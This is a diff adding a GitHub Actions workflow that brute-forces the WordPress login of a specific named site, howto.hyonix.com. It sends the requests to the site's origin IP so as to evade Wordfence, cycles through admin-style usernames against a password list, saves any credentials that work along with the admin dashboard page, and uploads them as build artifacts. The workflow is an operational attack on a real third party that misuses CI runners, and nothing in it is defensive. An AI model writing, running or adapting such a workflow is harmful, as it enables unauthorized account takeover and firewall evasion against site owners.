@@ -1,0 +1,43 @@
+name: WordPress Brute
+"on":
+  workflow_dispatch:
+
+jobs:
+  wp-brute:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: WordPress Brute Force
+        run: |
+          echo "Runner IP: $(curl -s ifconfig.me)"
+          
+          # Try via origin IP to bypass Wordfence
+          for user in admin administrator hyonix editor; do
+            while IFS= read -r pass; do
+              [ -z "$pass" ] && continue
+              result=$(curl -sk --connect-timeout 10 \
+                "https://5.161.125.229/wp-login.php" \
+                -H "Host: howto.hyonix.com" \
+                -d "log=$user&pwd=$pass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
+                -c /tmp/wp_cookies.txt \
+                -D /tmp/wp_headers.txt 2>&1)
+              
+              location=$(grep -i "location" /tmp/wp_headers.txt 2>/dev/null)
+              if echo "$location" | grep -qi "admin\|dashboard\|wp"; then
+                echo "*** WP ACCESS: $user:$pass ***"
+                echo "$location"
+                echo "$user:$pass" > /tmp/wp_found.txt
+                
+                # Get admin dashboard
+                curl -sk "https://5.161.125.229/wp-admin/" -H "Host: howto.hyonix.com" -b /tmp/wp_cookies.txt > /tmp/wp_admin.html 2>&1
+                exit 0
+              fi
+              sleep 2
+            done < passwords.txt
+          done
+          echo "No WP access found"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: wp-results
+          path: /tmp/wp_*.txt
+          if-no-files-found: ignore
